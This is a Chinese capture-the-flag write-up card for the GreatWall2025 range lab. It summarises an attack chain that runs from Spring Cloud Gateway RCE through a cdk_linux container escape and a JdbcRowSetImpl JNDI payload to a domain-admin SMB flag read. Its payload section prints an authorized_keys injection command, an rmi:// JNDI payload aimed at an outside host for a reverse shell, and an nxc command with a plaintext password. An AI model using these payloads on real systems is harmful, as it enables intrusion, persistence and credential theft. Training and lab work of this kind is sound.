---
title: "WP | 云境靶场 GreatWall2025"
category: web
tags: ["春秋云境 GreatWall2025 靶场", "web", "spring_cloud_gateway_rce", "cdk_linux_docker_escape", "jndi_rmi_jdbc_rowset", "mount_procfs_authorized_keys"]
signals: ["春秋云境 GreatWall2025 靶场 2025", "spring_cloud_gateway_rce", "cdk_linux_docker_escape", "jndi_rmi_jdbc_rowset", "mount_procfs_authorized_keys", "zabbix_ldap_dump", "bloodhound_ce", "reg_winlogon", "nxc_smb_type_flag", "rce", "GreatWall2025", "Spring", "Cloud", "Gateway"]
difficulty: hard
source: "https://www.ctfiot.com/273377.html"
tools: ["C", "Python", "Spring"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# WP | 云境靶场 GreatWall2025

> 赛事：春秋云境 GreatWall2025 靶场 2025 | 方向：web | 难度：hard | 工具：C、Python、Spring

## 一句话总结

春秋云境 GreatWall2025 长城杯靶场 WP，外网 Spring Cloud Gateway RCE → cdk_linux mount-procfs 容器逃逸 → 内网 JdbcRowSetImpl JNDI → zabbix LDAP 凭据 → bloodhound 域渗透 → 域管 SMB 读 flag。

## 攻击链

1. Flag1:Spring Cloud Gateway /routes RCE 写 SSH 公钥 → cdk_linux 容器逃逸 mount-procfs /host/proc 写 /root/.ssh/authorized_keys → Flag2:JdbcRowSetImpl dataSourceName=rmi:// 反弹 shell → ss -a -F /flag.txt → mysql zabbix.userdirectory_ldapG 凭据 dump → bloodhound-ce-python 域渗透 → nxc smb type C:\Users\Administrator\Desktop\flag.txt

## 关键 payload

```
./cdk_linux run mount-procfs /host/proc/ 'echo xxxxxx >> /root/.ssh/authorized_keys' / {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://172.16.22.12:50388/d3b02d","autoCommit":true} / nxc smb 172.16.22.41 -u administrator -p a4Z6FcRYSp6LLSGO -x 'type C:\Users\Administrator\Desktop\flag.txt
```

## 经验教训

cdk_linux (container-escape) + mount-procfs 是 2025 CTF 容器逃逸标配；Spring Cloud Gateway SpEL RCE 经 /routes 接口是经典外网入口。

## 标签

spring_cloud_gateway_rce、cdk_linux_docker_escape、jndi_rmi_jdbc_rowset、mount_procfs_authorized_keys、zabbix_ldap_dump、bloodhound_ce、reg_winlogon、nxc_smb_type_flag、aes_gcm_rsa_pkcs1、rtsp_8080

## 参考来源

- https://www.ctfiot.com/273377.html
- 原文件：WP_-_云境靶场GreatWall2025.full.md
